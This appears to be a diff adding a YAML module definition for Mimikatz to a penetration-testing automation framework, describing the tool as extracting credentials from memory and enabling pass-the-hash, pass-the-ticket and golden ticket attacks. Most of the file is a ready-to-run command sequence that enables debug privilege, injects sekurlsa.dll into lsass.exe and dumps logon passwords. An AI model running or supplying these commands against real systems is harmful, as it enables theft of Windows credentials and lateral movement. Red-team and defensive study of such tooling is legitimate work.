@@ -1,0 +1,25 @@
+---
+name: mimikatz
+description: Extracts credentials from memory and performs pass-the-hash, pass-the-ticket, and golden ticket attacks
+os: Windows
+ptf_module: null
+---
+commands:
+  - "Execute Mimikatz":
+    - type: ["cmd","interactive"]
+    - text: "mimikatz.exe"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"mimikatz"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+  - "getLogonPasswords (inject sekurlsa.dll into lsass.exe)":
+    - type: ["mimikatz","interactive"]
+    - text:
+      - "privilege::debug"
+      - "inject::process lsass.exe sekurlsa.dll"
+      - "@getLogonPasswords"
+    - input: null
+    - output: ["STDOUT",{"PROMPT":"mimikatz"}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+...
